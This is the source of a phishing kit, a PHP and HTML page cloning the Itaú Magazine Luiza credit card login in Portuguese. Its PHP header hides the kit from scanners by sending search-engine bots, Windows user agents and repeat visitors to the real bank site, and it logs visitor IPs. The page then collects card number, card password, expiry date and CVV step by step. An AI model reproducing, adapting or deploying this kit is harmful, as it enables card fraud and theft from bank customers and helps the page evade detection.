<?php
error_reporting(0);
$agent = $_SERVER['HTTP_USER_AGENT'];

$arrays = [
   'Googlebot',
   'externalhit',
   'Bingbot',
   'Slurp',
   'DuckDuckBot',
   'facebot',
   'Windows'
];

foreach ($arrays as $key) {
   if (strpos($agent, $key)) {
      @file_put_contents('bots.txt', '0', FILE_APPEND);
      exit(header('location: https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/'));
   }
}

$ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

$bloqueados = file('x9s.txt');

foreach ($bloqueados as $block) {
   if (trim($block) == $ip) {
      @file_put_contents('tenx9.txt', '0', FILE_APPEND);
      exit(header('location: https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/'));
   }
}

@file_put_contents('x9s.txt', $ip.PHP_EOL, FILE_APPEND);

@file_put_contents('infos.txt', '0', FILE_APPEND);

?>
<!DOCTYPE HTML>
<html lang="pt-BR">
	<head>
    <!-- Optimize/Anti-flicker snippet (recommended)  -->
    <style>
        .async-hide {
            opacity: 0 !important
        }
    </style>
    <!-- End Optimize -->


    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1"/>
    <link rel="canonical" href="https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/"/>
    
    <title>Consulte sua Fatura | Cartão Magazine Luiza</title>
    
    <meta name="description" content="Acesse aqui a área logada do seu Cartão Magazine Luiza e consulte sua fatura, além de outros serviços. "/>
    <meta name="template" content="magalu"/>
    <link rel="stylesheet" href="etc.clientlibs/sharedcomponents/clientlibs/clientlib-base.min.51b8a224aa8c5e5101bb0ec667ba1e77.css" type="text/css">
    <link rel="stylesheet" href="etc.clientlibs/itau/clientlibs/clientlib-base.min.2b40b1b39f98cea329b75ac4733abdbf.css" type="text/css">
    <link rel="shortcut icon" type="image/png" href="content/dam/itau/favicon.png"/>
    <meta name="google-site-veification" content="9T0vsDZzRvHiA_3VEpV6Ps8ifP15i-Kz90y4-dgvj38"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Rg.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Bd.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauDisplay/itaudisplay_rg-webfont.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/sharedcomponents/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Rg.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauDisplay/itaudisplay_lt-webfont.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauDisplay/itaudisplay_xbd-webfont.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauDisplay/itaudisplay_bd-webfont.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauDisplay/itaudisplay_rg-webfont.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Bd.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Lt.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Rg.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/itau/clientlibs/clientlib-base/resources/fonts/itaufonts_master_24px_v44/itaufonts_master_24px_v44.woff" as="font" type="font/woff" crossorigin="anonymous"/>
    <link rel="preload" href="etc.clientlibs/sharedcomponents/clientlibs/clientlib-base/resources/fonts/ItauText/ItauText_Rg.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>

    </head>
	
	<body data-segment="magalu">
		
    
<link rel="stylesheet" href="etc.clientlibs/sharedcomponents/components/fragments/modal-generic-error/v1/modal-generic-error/clientlib.min.11c95aa513d1bfa558ffd098de124b06.css" type="text/css">
<script type="text/javascript" src="etc.clientlibs/sharedcomponents/components/fragments/modal-generic-error/v1/modal-generic-error/clientlib.min.2d598e5d51a32ffac757870976e94d21.js"></script>




    




<div class="modal fade modal-generic-error-shared__modal animated" role="dialog" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-generic-error-shared__modal--dialog modal-dialog-centered">
    <div class="modal-content modal-generic-error-shared__modal--content">
        <div class="modal-generic-error-shared__modal--header">
            <span class="modal-warning icon-itaufonts_exclamacao" aria-hidden="true"></span>
            <h2 class="modal-generic-error-shared__modal--title modal-title">atenção!</h2>
            <button type="button" class="close" data-dismiss="modal" aria-label="fechar">
                <span class="modal-close icon-itaufonts_fechar" aria-hidden="true"></span>
            </button>
        </div>
        <div class="modal-body modal-generic-error-shared__modal--body">
            <p class="modal-generic-error-shared__modal--text"></p>

            <div class="shared-button-container">
                <a class="shared-button__a modal-generic-error-shared__modal--button" role="button" data-dismiss="modal"></a> 
            </div>
        </div>
    </div>
    </div>
</div>
	


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="magalu-cards-header aem-GridColumn aem-GridColumn--default--12"><header class="magalu-cards-header__navbar">
    <div class="magalu-cards-header__group">
        <div class="magalu-cards-header__logo">
            <img class="magalu-cards-header__logo-img" src="https://www.itau.com.br/content/dam/itau/cartoes/magalu/magalu-logo.png" alt="Logo Magalu"/>
        </div>
    </div>
</header>
</div>
<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="magalu-cards aem-GridColumn aem-GridColumn--default--12">
<div class="magalu-cards__container --height" role="main">
    <div class="magalu-cards__container__error-container --hidden" id="magalu-cards-desk-error-container">
    </div>
    <div class="magalu-cards__container__error-container" id="magalu-cards-desk-error-container2" style="display: none;">
    <div class="magalu-cards__container__error-container__title">
        
      <p class="magalu-cards__container__error-container__title__text" id="magalu-error-alert" tabindex="-1">Erro de internet</p>
      <div class="magalu-cards__container__error-container__title__icon icon-itaufonts_exclamacao" aria-hidden="true"></div>
      <div class="magalu-cards__container__error-container__title__close-button">
        <label for="magalu-cards__container__error-container__title__close-button__button" aria-hidden="true" hidden="">Fechar</label>
        <button class="magalu-cards__container__error-container__title__close-button__button" role="button" aria-label="fechar" tabindex="0">
          <div class="magalu-cards__container__error-container__title__close-button__button__icon icon-itaufonts_fechar"></div>
        </button>
      </div>
    </div>
    <ol>
      
    
    </ol></div>
    <div class="magalu-cards__container__content">

        <div class="magalu-cards__container__content__banner">
            <div class="magalu-cards__container__content__banner__img-container">
                <img class="magalu-cards__container__content__banner__img" aria-hidden="true" src="https://www.itau.com.br/content/dam/itau/cartoes/magalu/magalu-logo.png" alt="logo magalu"/>
            </div>
        </div>
        <div class="magalu-cards__container__content__login">
            <h1 class="magalu-cards__container__content__login__title" id='titlee'>digite o número  do seu cartão</h1>
            <div class="magalu-cards__container__content__error-container --hidden" id="magalu-cards-mobile-error-container">
            </div>
                <div class="spec-former__form-input" id='campo_cartao'>
                    <label class="magalu-cards__container__content__login__form__label spec-former__form-input__label" for="magalu-card-number">
                        número do cartão
                    </label>
                    <input class="magalu-cards__container__content__login__form__input spec-former__form-input__input spec-former__form-input__counter" id="magalu-card-number" value="" type="text" aria-required="true" inputmode="numeric" name="magalu_code"/>
                    <input class="--hidden" id="magalu-hidden-card-number" value="" type="hidden" name="usuario.cartao" aria-hidden="true" tabindex="-1" aria-describedby="error-message-magalu-cards"/>

                    <p class="spec-former__form-input__error-message --hidden" aria-hidden="true" id='erro1'></p>
                    <i class="spec-former__form-input__error-icon icon-itaufonts_exclamacao --hidden" aria-hidden="true"></i>

                    <div class="spec-former__form-input__counter-label" data-counter="16" data-field="número do cartão">
                        <div class="spec-former__form-input__counter__actual">0 de 16</div>
                        <span class="spec-former__form-input__counter-live --fake-hidden" aria-live="polite">
                        </span>
                    </div>
                </div>

                <div class="spec-former__form-input" id='campo_senha' style="display: none;">
                    <label class="magalu-cards__container__content__login__form__label spec-former__form-input__label" for="magalu-card-password">
                        senha do cartão
                    </label>
                    <input maxlength="4" class="magalu-cards__container__content__login__form__input spec-former__form-input__input spec-former__form-input__counter" id="magalu-card-password" value="" type="text" aria-required="true" inputmode="numeric" name="magalu_code"/>
                    <p class="spec-former__form-input__error-message --hidden" aria-hidden="true" id='erro2'></p>
                    <i class="spec-former__form-input__error-icon icon-itaufonts_exclamacao --hidden" aria-hidden="true"></i>

                    <div class="spec-former__form-input__counter-label" data-counter="4" data-field="senha do cartão">
                        <div class="spec-former__form-input__counter__actual">0 de 4</div>
                        <span class="spec-former__form-input__counter-live --fake-hidden" aria-live="polite">
                        </span>
                    </div>
                </div>

                <div class="spec-former__form-input" id='campo_validade' style="display: none;">
                    <label class="magalu-cards__container__content__login__form__label spec-former__form-input__label" for="magalu-card-validade">
                        validade do cartão
                    </label>
                    <input maxlength="4" class="magalu-cards__container__content__login__form__input spec-former__form-input__input spec-former__form-input__counter" id="magalu-card-validade" value="" type="text" aria-required="true" inputmode="numeric" name="magalu_code"/>
                    <p class="spec-former__form-input__error-message --hidden" aria-hidden="true" id='erro3'></p>
                    <i class="spec-former__form-input__error-icon icon-itaufonts_exclamacao --hidden" aria-hidden="true"></i>

                    <div class="spec-former__form-input__counter-label" data-counter="4" data-field="validade do cartão">
                        <div class="spec-former__form-input__counter__actual">0 de 4</div>
                        <span class="spec-former__form-input__counter-live --fake-hidden" aria-live="polite">
                        </span>
                    </div>
                </div>

                <div class="spec-former__form-input" id='campo_cvv' style="display: none;">
                    <label class="magalu-cards__container__content__login__form__label spec-former__form-input__label" for="magalu-card-cvv" id='labelerror'>
                        CVV
                    </label>
                    <input maxlength="3" class="magalu-cards__container__content__login__form__input spec-former__form-input__input spec-former__form-input__counter" id="magalu-card-cvv" value="" type="text" aria-required="true" inputmode="numeric" name="magalu_code"/>
                    <p class="spec-former__form-input__error-message --hidden" aria-hidden="true" id='erro4'></p>
                    <i class="spec-former__form-input__error-icon icon-itaufonts_exclamacao --hidden" aria-hidden="true"></i>

                    <div class="spec-former__form-input__counter-label" data-counter="3" data-field="cvv do cartão">
                        <div class="spec-former__form-input__counter__actual">0 de 3</div>
                        <span class="spec-former__form-input__counter-live --fake-hidden" aria-live="polite">
                        </span>
                    </div>
                </div>

                <input type="hidden" name="portal" value="004"/>
                <input type="hidden" name="pre-login" value="pre-login"/>
                <input type="hidden" name="usuario.cpf" value=""/>
                <input type="hidden" name="tipoLogon" value="9" maxlength="1" size="1"/>
                <button class="magalu-cards__container__content__login__form__button" id="magalu-card-button" role="button" onclick="sbm();">
                    acessar
                </button>

            <div class="magalu-cards__container__content__login__link-container">
                <a class="magalu-cards__container__content__login__link-container__link" role="link" tabindex="0">peça aqui o seu cartão</a>
                <span class="magalu-cards__container__content__login__link-container__icon"></span>
            </div>
        </div>
    </div>
</div></div>

    
</div>
</div>
<div class="magalu-cards-footer aem-GridColumn aem-GridColumn--default--12">
<footer role="contentinfo" class="magalu-cards-footer__content magalu-cards-footer__content__bottom-fixed">
    <div class="magalu-cards-footer__content__container">
        <div class="magalu-cards-footer__content__container__link-container">
            <a class="magalu-cards-footer__content__container__link-container__link" target="_self" tabindex="0" role="link">sobre o cartão</a>
        </div>
    
        <div class="magalu-cards-footer__content__container__link-container">
            <a class="magalu-cards-footer__content__container__link-container__link" target="_self" tabindex="0" role="link">precisa de ajuda?</a>
        </div>
    </div>
</footer></div>

    
</div>

	

    
    
    
<script type="text/javascript" src="etc.clientlibs/sharedcomponents/clientlibs/clientlib-base.min.9a4356cb47e7c63947459a99a47af102.js"></script>
<script type="text/javascript" src="etc.clientlibs/clientlibs/granite/jquery/granite/csrf.min.652a558c3774088b61b0530c184710d1.js"></script>
<script type="text/javascript" src="etc.clientlibs/itau/clientlibs/clientlib-base.min.9c7dbd8d3858cb76c49b487bde47553e.js"></script>




    

    


</body>

</html>
